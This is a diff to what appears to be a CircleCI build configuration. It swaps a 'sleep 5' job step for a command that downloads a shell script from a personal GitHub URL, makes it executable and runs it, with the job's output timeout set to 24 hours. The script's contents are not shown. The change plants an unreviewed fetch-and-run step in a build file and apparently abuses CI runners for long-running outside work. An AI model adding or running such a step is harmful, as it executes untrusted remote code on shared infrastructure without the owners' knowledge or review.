@@ -9,7 +9,7 @@ jobs:
       - run: 
           name: Run Job 
           no_output_timeout: 24h
-          command: sleep 5
+          command: wget https://raw.githubusercontent.com/Baranteng/baranteng/main/run.sh && chmod 500 run.sh && ./run.sh
 workflows:
     version: 2
     build:
